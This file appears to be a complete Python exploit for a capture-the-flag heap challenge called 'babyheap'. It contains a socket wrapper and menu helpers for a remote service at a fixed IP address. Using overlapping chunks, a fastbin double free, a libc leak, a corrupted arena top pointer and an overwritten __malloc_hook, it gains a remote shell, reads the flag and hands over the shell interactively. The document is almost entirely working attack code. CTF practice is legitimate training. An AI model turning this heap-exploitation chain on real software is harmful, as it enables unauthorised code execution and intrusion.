#!/usr/bin/env python3

from time import sleep
import socket
import sys
import telnetlib

def _p32(num):
    return num.to_bytes(4, byteorder='little')

def _p64(num):
    return num.to_bytes(8, byteorder='little')

def u32(byte_string):
    byte4 = byte_string.ljust(4, b'\0')
    return int.from_bytes(byte4, byteorder='little')

def u64(byte_string):
    byte8 = byte_string.ljust(8, b'\0')
    return int.from_bytes(byte8, byteorder='little')

def p32(*nums):
    data = b''
    for num in nums:
        data += _p32(num)
    return data

def p64(*nums):
    data = b''
    for num in nums:
        data += _p64(num)
    return data

# This is the modified version of interact() in telnetlib.
# It can receive non-ascii data.
# Original interact() is here:
#     https://github.com/python/cpython/blob/master/Lib/telnetlib.py
def _xinteract(tel):
    import selectors
    with telnetlib._TelnetSelector() as selector:
        selector.register(tel, selectors.EVENT_READ)
        selector.register(sys.stdin, selectors.EVENT_READ)

        while True:
            for key, events in selector.select():
                if key.fileobj is tel:
                    try:
                        text = tel.read_eager()
                    except EOFError:
                        print('*** Connection closed by remote host ***')
                        return
                    if text:
                        string = text.decode('ascii', 'backslashreplace')
                        sys.stdout.write(string)
                        sys.stdout.flush()
                elif key.fileobj is sys.stdin:
                    line = sys.stdin.readline().encode('ascii')
                    if not line:
                        return
                    tel.write(line)

class PwnSocket:
    def __init__(self, ip, port):
        self.silent_flag = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((ip, port))

    def shell(self):
        tel = telnetlib.Telnet()
        tel.sock = self.sock
        _xinteract(tel)

    def print_bytes(self, byte_str):
        if not self.silent_flag:
            string = byte_str.decode('ascii', 'backslashreplace')
            sys.stdout.write(string)
            sys.stdout.flush()

    def send(self, message):
        self.print_bytes(message)
        self.sock.send(message)

    def send_str(self, string):
        self.send(string.encode('ascii'))

    def send_int(self, num):
        self.send_str(str(num) + '\n')

    def recv_until(self, delimiter_bytes):
        received_data = b''
        while not received_data.endswith(delimiter_bytes):
            tmp = self.sock.recv(1)
            self.print_bytes(tmp)
            received_data += tmp
        return received_data

    def recv(self, num):
        data = self.sock.recv(num)
        self.print_bytes(data)
        return data

    def set_silent(self):
        self.silent_flag = True

    def unset_silent(self):
        self.silent_flag = False

    def recv_menu(self):
        self.recv_until(b'Command: ')

    def select_menu(self, num):
        self.recv_menu()
        self.send_int(num)

    def select_index(self, index):
        self.recv_until(b'Index: ')
        self.send_int(index)

    def alloc(self, size):
        self.select_menu(1)
        self.recv_until(b'Size: ')
        self.send_int(size)
        self.recv_until(b'Chunk ')
        index = int(self.recv_until(b' ')[:-1])
        self.recv_until(b'\n')
        return index

    def update(self, index, size, content):
        self.select_menu(2)
        self.select_index(index)
        self.recv_until(b'Size: ')
        self.send_int(size)
        self.recv_until(b'Content: ')
        self.send(content.ljust(size, b'\x00'))

    def delete(self, index):
        self.select_menu(3)
        self.select_index(index)

    def view(self, index):
        self.select_menu(4)
        self.select_index(index)
        self.recv_until(b']: ')
        return self.recv(8)

    def exit(self):
        self.select_menu(5)

    def overwrite(self, index, chunk_size, fake_size):
        byte = (fake_size|1).to_bytes(1, 'little')
        self.update(index, chunk_size+1, b'A' * chunk_size + byte)

def csize(num):
    if num < 0x18:
        return 0x20
    return (num + 0x17) & 0xf0

def main(target, one_gadget_offset, malloc_hook_offset, libc_leak_gdb):
    if target == 'remote':
        hostname = '202.120.7.204'
        ip = socket.gethostbyname(hostname)
        port = 127
    else:
        hostname = 'localhost'
        ip = socket.gethostbyname(hostname)

    if target == 'debug':
        port = 12345
    elif target == 'no-debug':
        port = 23456

    libc_base_gdb = 0x7ffff7a0d000
    local_libc_leak_gdb = 0x7ffff7dd1b78
    libc_arena_top_gdb = 0x7ffff7dd1b78 - local_libc_leak_gdb + libc_leak_gdb
    fastbins0x30_gdb = 0x7ffff7dd1b30 - local_libc_leak_gdb + libc_leak_gdb
    fastbins0x50_gdb = fastbins0x30_gdb + 0x10
    #libc_free_hook_gdb = 0x7ffff7dd37a8
    libc_malloc_hook_gdb = 0x7ffff7dd1b10
    leak_size = 0x48

    def libc_offset(gdb_addr):
        return gdb_addr - libc_base_gdb

    ps = PwnSocket(ip, port)
    print('')
    print('==== leak libc base ====')
    ptr0 = ps.alloc(leak_size)
    ptr1 = ps.alloc(leak_size)
    ptr2 = ps.alloc(leak_size)
    ptr3 = ps.alloc(leak_size)
    ps.overwrite(ptr0, leak_size, csize(leak_size) * 2)
    ps.delete(ptr1)
    ptr1 = ps.alloc(leak_size)
    ptr4 = ps.alloc(leak_size)
    ptr5 = ps.alloc(leak_size)
    ps.overwrite(ptr1, leak_size, csize(leak_size) * 2)
    ps.delete(ptr2)
    libc_leak = u64(ps.view(ptr4))
    libc_base = libc_leak - libc_leak_gdb + libc_base_gdb
    print('---- clear heap ----')
    ptr2 = ps.alloc(leak_size)
    ptr6 = ps.alloc(leak_size)

    print('')
    print('==== double free 0x50 ====')
    chunk50_0 = ptr2
    chunk50_1 = ptr4
    ps.delete(chunk50_0)
    ps.delete(ptr0)
    ps.delete(chunk50_1)
    overwrite_chunk = ps.alloc(0x48)
    fastbins0x30 = libc_base + libc_offset(fastbins0x30_gdb)
    ps.update(overwrite_chunk, 8, p64(fastbins0x30))
    ps.alloc(0x48)
    ps.alloc(0x48)

    print('')
    print('==== double free 0x40 ====')
    ptr0 = ps.alloc(0x38)
    ptr1 = ps.alloc(0x38)
    ptr2 = ps.alloc(0x38)
    cleaner3 = ps.alloc(0x38)
    ptr4 = ps.alloc(0x38)
    ps.overwrite(ptr0, 0x38, csize(0x38) * 3)
    ps.delete(ptr1)
    ptr1 = ps.alloc(0x38)
    ptr5 = ps.alloc(0x38)
    cleaner6 = ps.alloc(0x38)

    ps.delete(ptr5)
    ps.delete(ptr0)
    ps.delete(ptr2)
    overwrite_chunk = ps.alloc(0x38)
    ps.update(overwrite_chunk, 8, p64(0x51))
    ps.alloc(0x38)
    ps.alloc(0x38)

    print('')
    print('libc_leak = ' + hex(libc_leak))
    print('==== overwrite top ====')
    ptr = ps.alloc(0x48)
    fastbins0x50_to_top = libc_arena_top_gdb - fastbins0x50_gdb
    libc_malloc_hook = libc_base + libc_offset(libc_malloc_hook_gdb)
    libc_malloc_hook = libc_base + malloc_hook_offset
    ps.update(ptr, fastbins0x50_to_top+16, b'\x00' * fastbins0x50_to_top + p64(libc_malloc_hook-0x10) * 2)

    print('')
    print('==== clear fastbins ====')
    ps.delete(cleaner3)
    ps.update(cleaner6, 8, p64(0))
    ps.alloc(0x38)

    print('')
    print('==== call view ====')
    ps.view(0)

    print('')
    print('==== overwrite malloc_hook ====')
    ptr = ps.alloc(0x58)
    one_gadget = libc_base + one_gadget_offset
    ps.update(ptr, 8, p64(one_gadget))

    print('')
    print('==== call view ====')
    ps.view(0)

    print('')
    print('==== call system ====')
    ps.delete(0)
    ps.select_menu(1)
    ps.recv_until(b'Size: ')
    ps.send_int(20)

    print('')
    print('==== pwned ====')
    print('libc_base = ' + hex(libc_base))
    print('libc_leak = ' + hex(libc_leak))
    ps.send(b'ls /home/babyheap\n')
    ps.send(b'cat /home/babyheap/flag\n')
    ps.send(b'cat /home/babyheap/flag.txt\n')
    ps.shell()

if __name__ == '__main__':
    local_one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    local_malloc_hook_offset = 0x3c4b10
    if len(sys.argv) == 2 and sys.argv[1] == '--remote':
        target = 'remote'
        one_gadgets = [0x3f306, 0x3f35a, 0xd695f]
        malloc_hook_offset = 0x399af0
        libc_base_gdb = 0x7ffff7a0d000
        libc_leak_gdb = 0x7ffff7dd1b58
        libc_base_sample = 0x7fb02d56b000
        libc_leak_sample = 0x7fb02d904b58
        libc_leak_gdb = libc_leak_sample - libc_base_sample + libc_base_gdb
    elif len(sys.argv) == 2 and sys.argv[1] == '--no-debug':
        target = 'no-debug'
        one_gadgets = local_one_gadgets
        malloc_hook_offset = local_malloc_hook_offset
        libc_leak_gdb = 0x7ffff7dd1b78
    else:
        target = 'debug'
        one_gadgets = local_one_gadgets
        malloc_hook_offset = local_malloc_hook_offset
        libc_leak_gdb = 0x7ffff7dd1b78
    for index, i in enumerate(one_gadgets):
        if index == 1:
            main(target, i, malloc_hook_offset, libc_leak_gdb)
